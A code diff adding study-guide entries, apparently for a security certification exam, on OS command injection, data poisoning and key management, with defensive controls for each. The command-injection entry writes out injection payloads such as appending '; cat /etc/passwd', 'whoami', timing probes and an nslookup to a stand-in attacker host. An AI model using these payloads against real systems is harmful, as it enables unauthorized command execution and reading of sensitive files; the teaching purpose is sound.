@@ -187,6 +187,52 @@ dict(id="owasp-flaws", o="2.4", t="Access control, crypto failures, design and c
 <li><strong>Privilege escalation</strong>: vertical (user to admin) or horizontal (user to another user). Fix: least privilege, patching, removing SUID binaries and weak service permissions.</li></ul>
 """),
 
+dict(id="os-command-injection", o="2.4", t="OS command injection, step by step", q="command injection", h="""
+<p><strong>OS command injection</strong> happens when an application builds an operating-system command from user input and hands it to a shell. The shell treats certain characters as instructions, so the attacker can add commands of their own, and they run with the application&rsquo;s privileges.</p>
+<p><strong>Worked example.</strong> An internal page lets staff ping a host: the code runs <code>ping -c 4</code> followed by whatever was typed. The input <code>10.0.0.5</code> works as intended. The input <code>10.0.0.5; cat /etc/passwd</code> makes the shell run the ping and then print the password file. On Windows the same trick uses <code>&amp;</code>: <code>10.0.0.5 &amp; whoami</code>.</p>
+<div class="tblwrap"><table><tr><th>Characters</th><th>What the shell does with them</th></tr>
+<tr><td><code>;</code></td><td>Runs the next command (Linux)</td></tr>
+<tr><td><code>&amp;</code> and <code>&amp;&amp;</code></td><td>Runs the next command / runs it only if the first succeeded</td></tr>
+<tr><td><code>|</code> and <code>||</code></td><td>Pipes output into the next command / runs it only if the first failed</td></tr>
+<tr><td><code>`cmd`</code> and <code>$(cmd)</code></td><td>Runs <code>cmd</code> and inserts its output</td></tr>
+<tr><td>Newline (<code>%0a</code>)</td><td>Starts a new command</td></tr></table></div>
+<p><strong>Blind command injection</strong> returns no output, so testers prove it with timing (<code>; sleep 10</code>, or <code>&amp; ping -n 11 127.0.0.1</code> on Windows, makes the response about ten seconds slower) or with out-of-band traffic (<code>; nslookup test.attacker.example</code>).</p>
+<p><strong>In the logs:</strong> URL-encoded metacharacters in parameters (<code>%3B</code> for <code>;</code>, <code>%7C</code> for <code>|</code>, <code>%26</code> for <code>&amp;</code>) followed by recon commands such as <code>whoami</code>, <code>id</code>, <code>uname -a</code> or <code>ipconfig</code>.</p>
+<p><strong>Controls, best first:</strong></p>
+<ol><li>Don&rsquo;t call the shell. Use the language&rsquo;s own library function for the job.</li>
+<li>If a program must run, pass the arguments as a list to an API that starts it without a shell (for example Python <code>subprocess.run([...], shell=False)</code>), so metacharacters stay literal text.</li>
+<li>Allow-list the input: for the ping page, accept only a valid IP address or hostname pattern.</li>
+<li>Run the application with least privilege, so an injected command can do less.</li>
+<li>A WAF rule is a compensating control while the code is fixed, not the fix.</li></ol>
+<p>Same family as SQL injection, different interpreter: SQL injection targets the database&rsquo;s query parser, command injection targets the operating system&rsquo;s shell.</p>
+""" + T.format("Escaping or blocklisting a few characters is the weakest fix, because attackers find the one you missed. The preferred answer is to avoid the shell or pass arguments safely, the same logic as parameterized queries for SQL injection.")),
+
+dict(id="data-poisoning", o="2.4", t="Data poisoning", q="poisoning", h="""
+<p><strong>Data poisoning</strong> attacks a system through the data it learns from or relies on. Instead of breaking the code, the attacker feeds it bad data so its output becomes wrong in a way that suits them. It is an integrity attack.</p>
+<div class="tblwrap"><table><tr><th>Kind</th><th>Goal</th><th>Example</th></tr>
+<tr><td>Availability (indiscriminate)</td><td>Degrade accuracy across the board</td><td>Flooding a spam filter&rsquo;s feedback loop with mislabeled mail until the filter stops being useful</td></tr>
+<tr><td>Targeted</td><td>Make the model wrong about specific inputs</td><td>Getting one malware family labeled benign so the classifier lets it through</td></tr>
+<tr><td>Backdoor</td><td>Normal behavior until a planted trigger appears</td><td>A small pattern in a file that makes the detector report it as clean</td></tr></table></div>
+<p>Security tools are exposed too: anomaly detection that learns its baseline while an intruder is already active, threat intelligence feeds seeded with false indicators so defenders block legitimate services, and user-feedback features (&ldquo;not spam&rdquo;) that an attacker can vote on at scale.</p>
+<p>Don&rsquo;t confuse poisoning with <strong>evasion</strong>. Poisoning corrupts the training data before the model is built; evasion crafts inputs that fool a model that is already trained.</p>
+<p><strong>Controls:</strong></p>
+<ul><li><strong>Provenance:</strong> know where every training set came from, prefer vetted sources, and hash or sign data sets so tampering shows.</li>
+<li><strong>Access control on the pipeline:</strong> limit who and what can write training data and labels.</li>
+<li><strong>Validation:</strong> outlier and duplicate detection, label audits, rate limits on user feedback.</li>
+<li><strong>Monitoring:</strong> track accuracy and drift against a trusted, held-out test set and alert on sudden changes.</li>
+<li><strong>Recovery:</strong> keep known-good data and model snapshots so you can roll back and retrain.</li></ul>
+""" + T.format("Encrypting the training data protects confidentiality, but poisoning is an integrity problem. The fitting controls are provenance, access control on who can write the data, and validation.")),
+
+dict(id="key-management", o="2.4", t="Cryptographic failures and key management", q="cryptographic", h="""
+<p>Strong algorithms still fail when the keys are handled badly, and many cryptographic failures come down to keys rather than math. The <strong>key lifecycle</strong>: generate (from a strong random source), distribute, store, use, rotate, revoke, back up or escrow, and destroy.</p>
+<div class="tblwrap"><table><tr><th>Approach</th><th>How it works</th><th>Strengths</th><th>Weaknesses</th></tr>
+<tr><td><strong>Centralized</strong></td><td>One team and one system (a KMS backed by an HSM) set policy and hold keys for the whole organization</td><td>Consistent policy, one audit trail, quick rotation and revocation</td><td>A high-value target and single point of failure, so it needs redundancy</td></tr>
+<tr><td><strong>Distributed</strong> (decentralized)</td><td>Each department or application runs its own key management, with or without coordination</td><td>Local control, no single point of failure</td><td>Inconsistent practice, key sprawl, hard to audit or revoke quickly</td></tr></table></div>
+<p><strong>Where keys belong:</strong> a <strong>hardware security module (HSM)</strong>, a tamper-resistant device that generates and uses keys without exposing them in plaintext (validated to FIPS 140-2 or 140-3); a cloud <strong>key management service</strong> (AWS KMS, Azure Key Vault, Google Cloud KMS); or a secrets manager for application credentials. Large systems use <strong>envelope encryption</strong>: a data key encrypts the data, and a key-encryption key held in the KMS encrypts the data key.</p>
+<p><strong>Failures to recognize:</strong> keys hard-coded in source or committed to a repository, the key stored on the same server as the data it protects, one key shared across many systems, keys that are never rotated, private keys readable by any user, and expired or self-signed certificates in production.</p>
+<p><strong>Controls:</strong> keep keys separate from the data, rotate on a schedule and after any suspected exposure, apply least privilege to key use, log every key operation, and run secret scanning in the CI pipeline to catch keys before they are committed.</p>
+""" + T.format("Data encrypted with AES-256 is still exposed if the key sits in a config file beside it. An answer that moves keys into an HSM or KMS usually fixes the real problem.")),
+
 # ---------------------------------------------------------------- 2.5
 dict(id="nsa-mitigations", o="2.4", t="NSA's top ten mitigation strategies", q="mitigation", h="""
 <p>A widely cited short list of controls from the US National Security Agency. Useful as a checklist when a question asks for the best general mitigation.</p>
